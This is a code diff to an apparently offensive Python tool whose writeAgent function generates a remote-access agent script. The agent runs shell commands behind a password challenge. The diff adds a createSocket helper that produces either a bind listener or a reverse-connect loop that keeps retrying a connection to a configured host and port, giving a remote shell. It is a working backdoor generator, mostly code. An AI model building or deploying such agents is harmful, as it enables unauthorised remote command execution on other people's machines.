@@ -3,12 +3,13 @@ import sys
 import logging
 
 
-def writeAgent(output, rhost, rport, password):
+def writeAgent(output, socket, host, port, password):
 
     agent  = '''
 
 import os
 import sys
+import time
 import socket
 import base64
 import hashlib
@@ -354,6 +355,12 @@ def shellCommand(command, cwd):
 
     return shellOutput.decode()
 
+
+
+def ConnectPy314(ip, port):
+    """Function to established a connection with Py314"""
+    {}
+
 # ------------------------------------------------------------------------------
 # ------------------------------------------------------------------------------
 # ------------------------------------------------------------------------------
@@ -372,49 +379,54 @@ if len(sys.argv) > 1:
     logging.basicConfig(level=level, format=logFormat, datefmt='%H:%M:%S')
 
 
-bindPort = {}
-bindAddress = '{}'
+ip = '{}'
+port = {}
 password = '{}'
 ciperPassword = hashlib.sha512(password.encode()).hexdigest()
 
-serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-serverSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+#serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+#serverSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
-serverSocket.bind((bindAddress, bindPort))
-serverSocket.listen(5)
+#serverSocket.bind((bindAddress, bindPort))
+#serverSocket.listen(5)
 
-logging.info(f"Listening on {{bindAddress}}:{{bindPort}}")
+#logging.info(f"Listening on {{bindAddress}}:{{bindPort}}")
 #print(f"[?] Listening on {{bindAddress}}:{{bindPort}}")
 
-while True:
 
-    try:
+try:
 
-        channel, cliAddress = serverSocket.accept()
-        logging.info(f"Received Connection from {{cliAddress[0]}}")
-        challenge, receivedHash = passwordChallenge(channel, password)
-        if challenge is True:
-            serverHandler(channel, password)
-        elif challenge is False:
-            logging.debug(f"Closing channel {{channel}}")
-            channel.close()
+    #channel, cliAddress = serverSocket.accept()
+    #logging.info(f"Received Connection from {{cliAddress[0]}}")
+    
+    channel = ConnectPy314(ip, port)
+    
+    challenge, receivedHash = passwordChallenge(channel, password)
+    if challenge is True:
+        serverHandler(channel, password)
+    elif challenge is False:
+        logging.debug(f"Closing channel {{channel}}")
+        channel.close()
 
 
-    except KeyboardInterrupt:
-        serverSocket.close()
-        exit()
-        
-        
-    except Exception as error:
-        logging.warning(f"{{error}}")
-        serverSocket.close()
-        exit()
+except KeyboardInterrupt:
+    #serverSocket.close()
+    channel.close()
+    exit()
+    
+    
+except Exception as error:
+    logging.warning(f"{{error}}")
+    #serverSocket.close()
+    #channel.close()
+    exit()
 
  
 
     '''.format(
-        rport,
-        rhost,
+        socket,
+        host,
+        port,
         password
     )
 
@@ -428,6 +440,55 @@ while True:
     except Exception as error:
         logger.warning(f"An error occured when trying to write agent : ")
         print(error)
+
+
+
+def createSocket(agentType):
+
+    if agentType == 'bind_agent':
+        socket = f"""
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+
+    s.bind((ip, port))
+    s.listen(5)
+
+    logging.info(f"Listening on {{ip}}:{{port}}")
+
+    while True:
+
+        channel, cliAddress = s.accept()
+        logging.info(f"Received Connection from {{cliAddress[0]}}")
+
+        return channel
+
+    """
+
+
+    elif agentType == 'reverse_listener':
+        socket = """
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+
+    logging.info(f"Trying to bind {ip}:{port}")
+
+    while True:
+
+        try:
+
+            s.connect((ip, port))
+            return s
+
+        except ConnectionError:
+            time.sleep(1)
+            pass
+
+
+
+    """
+
+
+    return socket
 
 # --------------------------------------------------------------------
 # --------------------------- Main -----------------------------------
